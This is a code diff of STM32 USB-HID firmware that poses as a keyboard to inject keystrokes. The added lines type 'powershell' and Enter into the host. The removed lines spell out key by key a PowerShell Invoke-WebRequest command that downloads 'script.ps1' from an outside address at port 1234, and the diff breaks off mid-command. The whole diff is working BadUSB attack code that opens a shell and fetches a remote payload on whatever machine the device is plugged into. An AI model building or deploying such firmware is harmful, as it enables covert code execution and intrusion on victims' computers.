@@ -115,840 +115,382 @@ int main(void)
       keyboardhid.KEYCODE1 = 0x00;
       USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //ralease GIU
 
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x2C;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <SPACE>
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release p
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
+      HAL_Delay(50);
 
 
       keyboardhid.KEYCODE1 = 0x13;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
+      keyboardhid.KEYCODE2 = 0x12;
+      keyboardhid.KEYCODE3 = 0x1A;
+      keyboardhid.KEYCODE4 = 0x08;
+      keyboardhid.KEYCODE5 = 0x15;
+      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press power
       HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release p
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x12;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press o
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release o
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x1A;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press w
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release w
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x08;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release e
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x15;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press r
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release r
+      keyboardhid.KEYCODE1 = 0x00;
+      keyboardhid.KEYCODE2 = 0x00;
+      keyboardhid.KEYCODE3 = 0x00;
+      keyboardhid.KEYCODE4 = 0x00;
+      keyboardhid.KEYCODE5 = 0x00;
       USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
 
       HAL_Delay(20);
 
       keyboardhid.KEYCODE1 = 0x16;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
+      keyboardhid.KEYCODE2 = 0x0B;
+      keyboardhid.KEYCODE3 = 0x08;
+      keyboardhid.KEYCODE4 = 0x0F;
+      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press shel
       HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release s
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x0B;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press h
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release h
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x08;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release e
+      keyboardhid.KEYCODE1 = 0x00;
+      keyboardhid.KEYCODE2 = 0x00;
+      keyboardhid.KEYCODE3 = 0x00;
+      keyboardhid.KEYCODE4 = 0x00;
       USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
 
       HAL_Delay(20);
 
       keyboardhid.KEYCODE1 = 0x0F;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press l
+      keyboardhid.KEYCODE2 = 0x28;
+      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press l <ENTER>
       HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release l
+      keyboardhid.KEYCODE1 = 0x00;
+      keyboardhid.KEYCODE2 = 0x00;
       USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
 
-      HAL_Delay(20);
 
-      keyboardhid.KEYCODE1 = 0x0F;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press l
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release l
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-      HAL_Delay(20);
-
-      keyboardhid.KEYCODE1 = 0x28;
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <Enter>
-      HAL_Delay(20);
-      keyboardhid.KEYCODE1 = 0x00;    //release <Enter>
-      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
 
       //----------------------------
       HAL_Delay(1000);
 
-              keyboardhid.KEYCODE1 = 0x0C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press I
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release I
-              keyboardhid.MODIFIER = 0x00;
-
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x11;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press n
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release n
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x19;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press v
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release v
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x12;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press o
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release o
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x0E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press k
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release k
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x08;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release e
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x2D;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press -
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release -
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x1A;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press W
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release W
-              keyboardhid.MODIFIER = 0x00;
-
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x08;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release e
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x05;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press b
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release b
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x15;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press R
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release R
-              keyboardhid.MODIFIER = 0x00;
-
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x08;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release e
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x14;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press q
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release q
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x18;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press u
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release u
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x08;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release e
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x16;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release s
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x17;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release t
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x2C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <SPACE>
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release <SPACE>
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x2D;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press -
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release -
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x18;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press U
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release U
-              keyboardhid.MODIFIER = 0x00;
-
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x15;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press r
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release r
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x0C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press i
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release i
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x2C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <SPACE>
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release <SPACE>
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x33;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press :
-              HAL_Delay(50);
-              keyboardhid.MODIFIER = 0x00;
-              keyboardhid.KEYCODE1 = 0x00;                            //release :
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-
-              keyboardhid.KEYCODE1 = 0x34;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press '
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release '
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-
-              keyboardhid.KEYCODE1 = 0x0B;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press h
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release h
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x17;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release t
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x17;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release t
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x13;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release p
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x33;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press :
-              HAL_Delay(50);
-              keyboardhid.MODIFIER = 0x00;
-              keyboardhid.KEYCODE1 = 0x00;                            //release :
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x38;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release /
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x38;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release /
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 1
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x24;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 7
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 7
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1F;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 2
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 2
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x37;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1F;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 2
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 2
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 1
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x37;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x21;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 4
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 4
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x26;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 9
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 9
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x37;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 1
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x27;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 0
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 0
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x33;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press :
-              HAL_Delay(50);
-              keyboardhid.MODIFIER = 0x00;
-              keyboardhid.KEYCODE1 = 0x00;                            //release :
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 1
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1F;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 2
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 2
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x20;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 3
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 3
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x21;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 4
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 4
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x38;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release /
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x16;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release s
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x06;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press c
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release c
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x15;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press r
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release r
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x0C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press i
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release i
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x13;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release p
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x17;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release t
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x37;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release .
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x13;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press p
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release p
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x16;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press s
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release s
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x1E;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release 1
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x34;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press '
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release '
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x2C;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <SPACE>
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release <SPACE>
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x2D;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press -
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release -
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.MODIFIER = 0x02;
-              keyboardhid.KEYCODE1 = 0x12;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press O
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release O
-              keyboardhid.MODIFIER = 0x00;
-
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x18;
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press u
-              HAL_Delay(50);
-              keyboardhid.KEYCODE1 = 0x00;                            //release u
-              USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-              HAL_Delay(50);
-
-              keyboardhid.KEYCODE1 = 0x17;
